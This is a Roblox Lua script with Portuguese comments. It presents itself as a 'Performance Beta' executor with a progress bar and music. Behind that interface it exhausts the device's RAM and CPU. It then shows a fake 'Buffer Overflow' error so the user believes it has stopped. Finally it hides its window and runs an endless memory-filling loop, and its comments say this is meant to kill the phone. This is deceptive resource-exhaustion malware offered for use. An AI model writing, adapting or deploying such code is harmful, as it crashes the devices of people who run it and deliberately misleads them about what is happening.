-- V26 EXECUTOR: FAST DECEPTION MODULE
-- Tempo de Carga: 166 segundos (02:46)
-- Falso Erro: 15 segundos | Música: 04:25

local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
local lixo_v26 = {}
local tempo_carga = 166 -- Ajustado para 2 minutos e 46 segundos
local tempo_musica = 265 

-- Interface
local Main = Instance.new("Frame", ScreenGui)
Main.Size = UDim2.new(0, 280, 0, 90)
Main.Position = UDim2.new(0.5, -140, 0.05, 0)
Main.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
Main.BorderSizePixel = 0

local Label = Instance.new("TextLabel", Main)
Label.Size = UDim2.new(1, 0, 0.6, 0)
Label.Text = "V26: Performance Beta 1.0"
Label.TextColor3 = Color3.fromRGB(0, 255, 150)
Label.BackgroundTransparency = 1
Label.Font = Enum.Font.GothamBold

local ProgressBar = Instance.new("Frame", Main)
ProgressBar.Size = UDim2.new(0, 0, 0, 5)
ProgressBar.Position = UDim2.new(0, 0, 0.9, 0)
ProgressBar.BackgroundColor3 = Color3.fromRGB(0, 200, 255)

-- ÁUDIO
local Sound = Instance.new("Sound", game.Workspace)
Sound.SoundId = "rbxassetid://142376088" 
Sound.Looped = true
Sound.Volume = 0.6
Sound:Play()

local function IniciarAtaqueV26()
    -- FASE 1: Estresse com Força Total
    for i = 1, tempo_carga do
        pcall(function()
            ProgressBar.Size = UDim2.new(i/tempo_carga, 0, 0, 5)
            
            -- Injeção de RAM (Dobra de Força)
            for j = 1, 12 do 
                table.insert(lixo_v26, string.rep("V26_BETA_TEST", 850000))
            end

            -- CPU & GPU
            task.spawn(function()
                local x = 0
                for _ = 1, 100000 do x = math.sqrt(math.random()) * math.tan(x) end
            end)
        end)
        task.wait(1)
    end

    -- FASE 2: Falso Erro (Aqui a pessoa acha que parou, mas o código CONTINUA)
    Label.Text = "BETA ERROR: Buffer Overflow (0x800)"
    Label.TextColor3 = Color3.fromRGB(255, 50, 50)
    ProgressBar.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    
    task.spawn(function()
        for i = 1, 15 do
            pcall(function()
                -- Durante o erro, o ataque fica MAIS FORTE
                table.insert(lixo_v26, string.rep("V26_SILENT_KILL", 1500000))
            end)
            task.wait(1)
        end
        Main:Destroy() -- A janelinha some, mas o ataque no fundo continua!
    end)

    -- FASE 3: Ataque Fantasma Infinito (O celular morre aqui)
    task.wait(tempo_musica - tempo_carga)
    Sound:Stop() 

    while true do
        pcall(function()
            task.spawn(function()
                while true do 
                    table.insert(lixo_v26, string.rep("V26_ULTIMATE", 3500000)) 
                end
            end)
        end)
        task.wait(0.04) 
    end
end

task.spawn(IniciarAtaqueV26)
